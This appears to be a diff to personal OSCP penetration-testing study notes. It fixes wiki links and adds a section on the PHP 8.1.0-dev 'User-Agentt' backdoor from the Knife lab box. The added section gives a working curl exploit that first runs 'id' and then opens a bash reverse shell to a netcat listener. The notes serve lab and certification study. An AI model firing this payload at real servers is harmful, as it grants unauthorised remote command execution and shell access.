@@ -327,7 +327,7 @@ https://$BoxIP:10000
 curl -k --tlsv1.0 "https://$BoxIP:10000" 2>/dev/null
 ```
 
-See [[Beep|Beep box writeup]] for the full worked chain (credential reuse into Webmin, cron job to root).
+See [[OSCP/BOXES/MASTER BOX LIST|Beep box writeup]] for the full worked chain (credential reuse into Webmin, cron job to root).
 
 #### Tags: #Webmin #ScheduledCronJob #TLSDowngrade #CredentialReuse
 
@@ -742,7 +742,7 @@ This page turns one repeatable part of an authorized assessment into a checklist
 
 ## Related Modules
 
-- [[MODULES/08. Introduction to Web Application Attacks]] -- module concepts used by this hub page
+- [[OSCP/MODULES/08. Introduction to Web Application Attacks]] -- module concepts used by this hub page
 
 ## Demonstrated in box write-ups
 
@@ -771,3 +771,26 @@ curl -sS -G \
 ```
 
 Serve a minimal controlled PHP file with `python3 -m http.server`; base64-encode nested reverse-shell text if quoting becomes unreliable.
+
+## PHP 8.1.0-dev `User-Agentt` backdoor
+
+When HTTP headers disclose `X-Powered-By: PHP/8.1.0-dev`, test the known development-build backdoor with a harmless identity command. The trigger is the misspelled `User-Agentt` header, with two `t` characters.
+
+```bash
+curl -sSI "http://$BoxIP:$WebPort/" | tee "$BoxDir/loot/headers.txt"
+curl -fsS -H 'User-Agentt: zerodiumsystem("id");' \
+  "http://$BoxIP:$WebPort/" | grep -m1 'uid='
+```
+
+After the output proves execution, send the callback through the same header:
+
+```bash
+nc -lvnp "$Lport"
+curl --max-time 10 -fsS \
+  -H "User-Agentt: zerodiumsystem(\"bash -c 'bash -i >& /dev/tcp/$LocalIP/$Lport 0>&1'\");" \
+  "http://$BoxIP:$WebPort/" >/dev/null
+```
+
+`zerodiumsystem()` is evaluated by the compromised PHP build. Treat the header as a command-execution primitive, not as a normal application parameter, and move to [[RUNBOOK V2/Linux - RCE to Shell|Linux - RCE to Shell]] after the identity proof.
+
+**Seen in:** [[OSCP/BOXES/WRITE UPS/Linux/Knife|Knife]].
